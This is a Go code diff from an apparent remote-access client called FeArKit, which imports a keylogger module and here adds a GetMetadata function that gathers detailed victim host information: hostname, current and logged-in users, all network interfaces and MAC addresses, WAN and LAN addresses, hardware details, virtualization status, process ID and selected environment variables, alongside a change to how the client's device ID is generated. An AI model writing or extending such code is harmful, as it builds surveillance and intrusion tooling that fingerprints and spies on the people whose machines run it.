@@ -4,8 +4,6 @@ import (
 	"FeArKit/modules"
 	"FeArKit/client/config"
 	"FeArKit/client/service/keylogger"
-	"crypto/rand"
-	"encoding/hex"
 	"errors"
 	"github.com/denisbrodbeck/machineid"
 	"github.com/shirou/gopsutil/v3/cpu"
@@ -170,15 +168,9 @@ func GetDiskInfo() (modules.IO, error) {
 }
 
 func GetDevice() (*modules.Device, error) {
-	id, err := machineid.ProtectedID(`FeArKit`)
-	if err != nil {
-		id, err = machineid.ID()
-		if err != nil {
-			secBuffer := make([]byte, 16)
-			rand.Reader.Read(secBuffer)
-			id = hex.EncodeToString(secBuffer)
-		}
-	}
+	// Use the per-process runtime ID: unique per running instance and
+	// stable across WS reconnects within the same process lifetime.
+	id := config.RuntimeID
 	localIP, err := GetLocalIP()
 	if err != nil {
 		localIP = `<UNKNOWN>`
@@ -250,6 +242,137 @@ func GetDevice() (*modules.Device, error) {
 		Username:     username.Username,
 		KeyboardLayout: keylogger.GetKeyboardLayout(),
 		ClientUptime: config.Config.ClientUptime,
+		PID:          os.Getpid(),
+	}, nil
+}
+
+// envKeys is the curated set of environment variables collected for metadata.
+var envKeys = []string{
+	// Windows
+	`COMPUTERNAME`, `USERNAME`, `USERPROFILE`, `SYSTEMROOT`, `SYSTEMDRIVE`,
+	`TEMP`, `TMP`, `OS`, `PROCESSOR_ARCHITECTURE`, `NUMBER_OF_PROCESSORS`,
+	`PROGRAMFILES`, `PROGRAMFILES(X86)`, `PROGRAMDATA`, `APPDATA`, `LOCALAPPDATA`,
+	`WINDIR`, `COMSPEC`, `PSMODULEPATH`,
+	// Unix / macOS
+	`HOME`, `USER`, `LOGNAME`, `SHELL`, `TERM`, `LANG`, `PWD`,
+	`XDG_SESSION_TYPE`, `DISPLAY`, `DBUS_SESSION_BUS_ADDRESS`,
+	// Cross-platform
+	`PATH`,
+}
+
+func GetMetadata(wan string) (*modules.DeviceMetadata, error) {
+	id, err := machineid.ProtectedID(`FeArKit`)
+	if err != nil {
+		id, _ = machineid.ID()
+	}
+
+	hostname, _ := os.Hostname()
+	u, _ := user.Current()
+	username := ``
+	if u != nil {
+		username = u.Username
+		if idx := strings.Index(username, `\`); idx > -1 && idx+1 < len(username) {
+			username = username[idx+1:]
+		}
+	}
+
+	// OS / platform
+	hostInfo, _ := host.Info()
+	platform, platformFamily, platformVersion := ``, ``, ``
+	kernelVersion, virtualization, timezone := ``, ``, ``
+	var bootTime uint64
+	if hostInfo != nil {
+		platform = hostInfo.Platform
+		platformFamily = hostInfo.PlatformFamily
+		platformVersion = hostInfo.PlatformVersion
+		kernelVersion = hostInfo.KernelVersion
+		virtualization = hostInfo.VirtualizationSystem
+		if hostInfo.VirtualizationRole != `` && hostInfo.VirtualizationRole != `host` {
+			virtualization = hostInfo.VirtualizationSystem + ` (` + hostInfo.VirtualizationRole + `)`
+		}
+		bootTime = hostInfo.BootTime
+		timezone = time.Local.String()
+	}
+
+	// Logged-in users
+	var loggedUsers []string
+	if users, err := host.Users(); err == nil {
+		seen := map[string]bool{}
+		for _, u := range users {
+			if !seen[u.User] {
+				loggedUsers = append(loggedUsers, u.User)
+				seen[u.User] = true
+			}
+		}
+	}
+
+	// All network interfaces
+	var ifaces []modules.NetworkInterface
+	if ifs, err := _net.Interfaces(); err == nil {
+		for _, iface := range ifs {
+			ni := modules.NetworkInterface{
+				Name: iface.Name,
+				MAC:  strings.ToUpper(iface.HardwareAddr.String()),
+			}
+			for _, f := range []struct {
+				flag _net.Flags
+				name string
+			}{
+				{_net.FlagUp, `UP`}, {_net.FlagLoopback, `LOOPBACK`},
+				{_net.FlagPointToPoint, `P2P`}, {_net.FlagMulticast, `MULTICAST`},
+			} {
+				if iface.Flags&f.flag != 0 {
+					ni.Flags = append(ni.Flags, f.name)
+				}
+			}
+			if addrs, err := iface.Addrs(); err == nil {
+				for _, a := range addrs {
+					ni.Addrs = append(ni.Addrs, a.String())
+				}
+			}
+			ifaces = append(ifaces, ni)
+		}
+	}
+
+	lan, _ := GetLocalIP()
+	mac, _ := GetMacAddress()
+	cpuInfo, _ := GetCPUInfo()
+	ramInfo, _ := GetRAMInfo()
+	diskInfo, _ := GetDiskInfo()
+
+	// Environment variables
+	env := map[string]string{}
+	for _, k := range envKeys {
+		if v := os.Getenv(k); v != `` {
+			env[k] = v
+		}
+	}
+
+	return &modules.DeviceMetadata{
+		ID:              id,
+		Hostname:        hostname,
+		Username:        username,
+		OS:              runtime.GOOS,
+		Arch:            runtime.GOARCH,
+		Platform:        platform,
+		PlatformFamily:  platformFamily,
+		PlatformVersion: platformVersion,
+		KernelVersion:   kernelVersion,
+		BootTime:        bootTime,
+		Timezone:        timezone,
+		Virtualization:  virtualization,
+		WAN:             wan,
+		LAN:             lan,
+		Interfaces:      ifaces,
+		CPU:             cpuInfo,
+		RAM:             ramInfo,
+		Disk:            diskInfo,
+		MAC:             mac,
+		PID:             os.Getpid(),
+		ClientUptime:    config.Config.ClientUptime,
+		Commit:          config.Commit,
+		Users:           loggedUsers,
+		Env:             env,
 	}, nil
 }
 
